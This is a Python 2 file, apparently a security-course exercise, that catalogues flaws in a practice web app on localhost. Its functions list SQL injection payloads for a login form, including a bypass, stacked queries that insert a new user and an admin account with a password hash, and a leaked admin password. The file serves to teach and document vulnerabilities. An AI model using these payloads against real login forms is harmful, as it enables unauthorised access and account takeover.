__author__ = 'sec15334'

from Utils import Flaw as fl
from Utils import FieldSolution as fs
from Utils import MethodHelp as mh

def help():
    loginhelp = mh('login_page','SQL inject')
    adminloginpageaccess = mh('adminlogin_page_access','Information gathering')
    logininsertuser = mh('login_page_insertuser','SQL inject insert user')
    logininsertadmin = mh('login_page_insertadmin','SQL inject insert admin with password hallo')
    print loginhelp.print_help()
    print adminloginpageaccess.print_help()
    print logininsertuser.print_help()





def login_page():
    flaw = fl('SQLinject','http://localhost:8081/secu/login.secu','SQL inject in login')
    field1 = fs('username','Not validated - look forum','alan')
    field2 = fs('password',"Not validated","test' or '1' = '1")
    flaw.fields.append(field1)
    flaw.fields.append(field2)
    return flaw.printFlaw()

def login_page_insertadmin():
    flaw = fl('Information leakage','http://localhost:8081/secu/login.secu','sqlinject admin')
    field1 = fs('username','not validated','alan')
    field2 = fs('password','sql inject',"t' or '1' = '1'; insert into M_ADMIN (ID,mpwd) values (2,'d3751d33f9cd5049c4af2b462735457e4d3baf130bcbb87f389e349fbaeb20b9');select count(*) from M_USER where muname='chris' and mpwd='pwd5")
    flaw.fields.append(field1)
    flaw.fields.append(field2)
    return flaw.printFlaw()

def login_page_insertuser():
    flaw = fl('SQLinject','http://localhost:8081/secu/login.secu','SQL inject in login')
    field1 = fs('username','Not validated - look forum','alan')
    field2 = fs('password',"Not validated","t' or '1' = '1'; insert into M_USER (ID,muname,mpwd) values (6,'chris','pwd5');select count(*) from M_USER where muname='alan' and mpwd='pwd1")
    flaw.fields.append(field1)
    flaw.fields.append(field2)
    return flaw.printFlaw()

def adminlogin_page_access():
    flaw = fl('Information leakage','http://localhost:8081/secu/login.secu','Leakage in login')
    field1 = fs('javascript','obfuscated','click invisible point after last word')
    field2 = fs('password','cheat for password or use sql inject','#muse1')
    flaw.fields.append(field1)
    flaw.fields.append(field2)
    return flaw.printFlaw()
